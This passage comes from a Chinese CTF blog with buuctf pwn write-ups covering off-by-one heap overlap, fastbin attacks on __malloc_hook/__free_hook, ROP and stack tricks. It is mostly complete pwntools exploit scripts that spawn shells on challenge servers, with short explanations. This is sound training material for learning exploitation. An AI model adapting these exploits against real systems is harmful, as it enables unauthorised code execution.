class="line">base = libc_start_main - libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x88</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeefdeadbeef</span>)</span><br><span class="line">payload += p64(<span class="number">0x400A93</span>)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(sys)</span><br><span class="line">Input(payload)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;&gt;&gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>.ljust(<span class="number">0x20</span>, <span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu064-0ctf-2017-babyheap"><a href="#buu064-0ctf-2017-babyheap" class="headerlink" title="buu064-0ctf_2017_babyheap"></a>buu064-0ctf_2017_babyheap</h1><p>同第29题。</p>
<h1 id="buu065-hitcontraining-heapcreator"><a href="#buu065-hitcontraining-heapcreator" class="headerlink" title="buu065-hitcontraining_heapcreator"></a>buu065-hitcontraining_heapcreator</h1><p><img src="https://img-blog.csdnimg.cn/ee98c4fd428c48e5a5cce67ba8c49080.png"><br>容易得到程序控制的结构体如上，一共可以申请至多10个这样的结构体。包含创建、删除、打印、修改选项，其中修改选项中含有off by one漏洞。<br><img src="https://img-blog.csdnimg.cn/2dd662ca768446d3ae2390f0efe29bbd.png"><br>这里read_input函数中使用的是read函数，因此这一个溢出的字节可以是任何值。将这个字节的值变大会导致堆块重叠。<br><img src="https://img-blog.csdnimg.cn/7f8572fa62504c848ba59db286f7462d.png"></p>
<p>这里插一条笔记：</p>
<blockquote>
<p>如果使用free函数释放紧邻top chunk下面的大于最大fastbin容纳范围的chunk，当这个chunk的大小加上top chunk的大小大于FASTBIN_CONSOLIDATION_THRESHOLD（65536）时会触发malloc_consolidate()函数将所有的fastbin清空并归位到unsorted bins中。详情请见<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c">源码</a>第4054~4076行。调试中无意发现，在此记录，与本题关系不大。</p>
</blockquote>
<p>经过调试验证，证实上面的思路是正确的。我们成功通过off by one漏洞获取到一个chunk_info的读写权限。<br><img src="https://img-blog.csdnimg.cn/0104512ec7b74742b6584e81d26c8015.png"><br><img src="https://img-blog.csdnimg.cn/315403dbf3594750991e6053479fbac4.png"><br>那么，后面的思路也就清晰了：将后面一个chunk_info的可读写空间调大，获取到#4中的main_arena地址，进而计算libc基地址。然后直接将#3的可写地址改为__free_hook地址，写入one_gadget，再调用free函数即可getshell。<br><img src="https://img-blog.csdnimg.cn/f8373cceb674431d88068c1a464b4e90.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27833</span>)</span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Size of Heap : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Content of heap : &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[0]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">create(<span class="number">0x48</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[2]</span></span><br><span class="line">edit(<span class="number">0</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[1]</span></span><br><span class="line">edit(<span class="number">1</span>, cyclic(<span class="number">0x40</span>) + p64(<span class="number">0x51</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x100</span>))  <span class="comment"># change the readable size of heaparray[2]</span></span><br><span class="line">create(<span class="number">0x88</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[3]</span></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4]</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x70</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aabcaab&#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">88</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&quot;__malloc_hook&quot;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&quot;__free_hook&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的这个payload是用来还原部分堆环境的</span></span><br><span class="line"><span class="comment"># 因为前面读取使用printf函数，在main_arena地址之前不能有空字节，所以会覆盖掉两个chunk的控制信息</span></span><br><span class="line"><span class="comment"># 这里将其还原，保证后面创建chunk的时候能够正常</span></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(<span class="number">0xdeadbeef</span>)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x68</span>, <span class="string">b&#x27;colin&#x27;</span>)  <span class="comment"># heaparray[4], reallocate</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>)</span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">payload += p64(__free_hook)     <span class="comment"># change write address to __free_hook</span></span><br><span class="line">payload += p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line">edit(<span class="number">3</span>, p64(base + one_gadgets[<span class="number">1</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu066-roarctf-2019-easy-pwn"><a href="#buu066-roarctf-2019-easy-pwn" class="headerlink" title="buu066-roarctf_2019_easy_pwn"></a>buu066-roarctf_2019_easy_pwn</h1><p>也是一道考察off by one漏洞的题目。<br>经过分析，本题使用的数据结构如下：一共可以创建至多16个这样的结构。<br><img src="https://img-blog.csdnimg.cn/d9fc61de667c4c83ba62a363b6514942.png"><br>在write_note实现函数中，当输入的size值是原来定义值-10时会触发一个off by one漏洞，能够溢出一个字节。<br><img src="https://img-blog.csdnimg.cn/8ddfaca95d8f48b9bc11c23df6963886.png"><br>可见本题的思路和上一题类似，但由于本题的堆环境不同，需要对利用姿势加以修改。<br><img src="https://img-blog.csdnimg.cn/7785923b09064a4aa9d59ff219f2d8ad.png"></p>
<p>如上图所示，我们通过off by one漏洞将下一个chunk的size改大，使其能够正好覆盖下一个chunk。由于可读写的空间大小保存在bss段，因此此时我们可读写的空间大小实际上并没有改变。然后将这个改大的chunk释放，这样就会产生一个和下一个chunk完全重合的free chunk，在内部保存有main_arena的地址。通过读取下一个chunk即可获取。<br><img src="https://img-blog.csdnimg.cn/a8952a896bc94888b02f240b7d30f34d.png"><br>获取到__malloc_hook的地址之后，我们可以通过上图的方式进行fastbin attack。同样是堆块重叠，但这次是将整个unsorted bin chunk都重新申请回来，通过中间的chunk #4修改chunk #5的fd指针到__malloc_hook，这样可以在接下来申请到__malloc_hook处的chunk。</p>
<p>然后，我们可以在__malloc_hook中写入one_gadget的地址。但经过测试发现，能够使用的4个one_gadget都不能让我们获得shell。通过one_gadget打印出来的地址可以知道，这些one_gadget想要执行是有一定条件的，如栈上某个地址需要为0，rax为0等等。如果直接将one_gadget写入__malloc_hook不行，可以考虑将one_gadget写到__realloc_hook中，在__malloc_hook中写realloc函数中的地址，注意我们想要修改栈的环境，需要写realloc+4的地址，这样可以避免执行push rbp; mov rbp, rsp这两条指令，从而产生8字节的错位。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;node4.buuoj.cn&#x27;, 25959)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4b6, 0x3f50a, 0xd5a27]</span></span><br><span class="line">one_gadgets = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line"><span class="comment"># one_gadgets = [0x45206, 0x4525a, 0xef9f4, 0xf0897]</span></span><br><span class="line"><span class="comment"># one_gadgets = [0x3f4a6, 0x3f4fa, 0xd5b87]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_note</span>(<span class="params">size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_note</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">drop_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_note</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #0</span></span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #2</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #3</span></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #4</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line"></span><br><span class="line">create_note(<span class="number">0x18</span>)   <span class="comment"># chunk_info #6</span></span><br><span class="line">write_note(<span class="number">0</span>, <span class="number">0x48</span>+<span class="number">10</span>, cyclic(<span class="number">0x48</span>) + <span class="string">b&#x27;\xE1&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">1</span>)</span><br><span class="line">create_note(<span class="number">0x48</span>)   <span class="comment"># chunk_info #1</span></span><br><span class="line">show_note(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">8</span>)) - <span class="number">88</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena))</span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;__malloc_hook&quot;</span>, __malloc_hook)</span><br><span class="line">base = __malloc_hook - libc.dump(<span class="string">&#x27;__malloc_hook&#x27;</span>)</span><br><span class="line">__free_hook = base + libc.dump(<span class="string">&#x27;__free_hook&#x27;</span>)</span><br><span class="line">realloc = base + libc.dump(<span class="string">&#x27;realloc&#x27;</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #7, same addr as #2</span></span><br><span class="line">write_note(<span class="number">3</span>, <span class="number">0x18</span>+<span class="number">10</span>, cyclic(<span class="number">0x18</span>) + <span class="string">b&#x27;\x91&#x27;</span>)</span><br><span class="line">drop_note(<span class="number">4</span>)</span><br><span class="line">create_note(<span class="number">0x88</span>)   <span class="comment"># chunk_info #4, overlap #5</span></span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">drop_note(<span class="number">5</span>)</span><br><span class="line">write_note(<span class="number">4</span>, <span class="number">0x88</span>, (<span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x20</span>) + p64(<span class="number">0x71</span>) + p64(__malloc_hook - <span class="number">0x23</span>)).ljust(<span class="number">0x88</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #5</span></span><br><span class="line">create_note(<span class="number">0x68</span>)   <span class="comment"># chunk_info #8, to __malloc_hook</span></span><br><span class="line">write_note(<span class="number">8</span>, <span class="number">0x13</span> + <span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xB</span> + p64(base + one_gadgets[<span class="number">3</span>]) + p64(realloc + <span class="number">4</span>))</span><br><span class="line">create_note(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's Pwnhome">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/buuctf-pwn-write-ups-3/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (3)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:27:57" itemprop="dateCreated datePublished" datetime="2023-02-28T22:27:57+08:00">2023-02-28</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="buu027-HarekazeCTF2019-baby-rop2"><a href="#buu027-HarekazeCTF2019-baby-rop2" class="headerlink" title="buu027-[HarekazeCTF2019]baby_rop2"></a>buu027-[HarekazeCTF2019]baby_rop2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29802</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">poprdi_ret = <span class="number">0x400733</span></span><br><span class="line">poprsir15_ret = <span class="number">0x400731</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(<span class="number">0x400790</span>)</span><br><span class="line">payload += p64(poprsir15_ret)</span><br><span class="line">payload += p64(elf.got[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">read = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line">base = read - libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x28</span>)</span><br><span class="line">payload += p64(poprdi_ret)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">payload += p64(elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;What\&#x27;s your name? &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="buu028-ciscn-2019-es-2"><a href="#buu028-ciscn-2019-es-2" class="headerlink" title="buu028-ciscn_2019_es_2"></a>buu028-ciscn_2019_es_2</h1><p>这一题乍一看是栈溢出，但最鸡贼的是只能溢出4个字节，也就是只够覆盖返回地址。不过还是有办法拿到libc的地址的：</p>
<p><img src="https://img-blog.csdnimg.cn/ce7a88efd4434a0c99b9f83f73ff0205.png"><br>这是还没有进入vul函数时的栈环境，可以看到下面的f7de3ed5是libc之中的地址（_dl_fini是ld.so中的地址，而不是libc的）。我们溢出之后程序会打印出后面一部分地址的值，但是遇到空字节会截断。于是我们可以反复返回到vul函数的开头，你会发现每一次返回后，存返回地址的地址都会向后移4个字节。于是我们通过这种方法返回4次vul函数就能够成功越过上图ebp的0字节，通过printf获取libc地址。</p>
<p>有了libc之后，我们需要考虑如何执行system函数。要知道，我们只能溢出4个字节。别慌，我们有main函数。在进入vul函数时，memset只会将前20个字符清零，而对后面的不作处理，这就给了我们一丝机会。我们想把”\bin\sh”的地址写到返回地址的后面，肯定不能直接溢出，因为长度不够。所以我们干脆就返回到main函数中，要知道main函数也是占用一定的栈空间的，这样做可以让下一次执行vul函数时的栈向下压。这样原先写到栈上的”\bin\sh”地址就到了函数返回地址的后面去了。</p>
<p><img src="https://img-blog.csdnimg.cn/41d684be9aa04ef2873caabce063d9e9.png"><br>这个过程建议通过gdb调试一下加深理解。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25990</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># repeat 3 times of function vul to reach address of __libc_start_main + 241</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Welcome, my friend. What\&#x27;s your name?\n&#x27;</span>, cyclic(<span class="number">0x30</span>))</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Hello&#x27;</span>, cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.send(cyclic(<span class="number">0x2c</span>) + p32(elf.symbols[<span class="string">&#x27;vul&#x27;</span>]))</span><br><span class="line">io.sendafter(<span 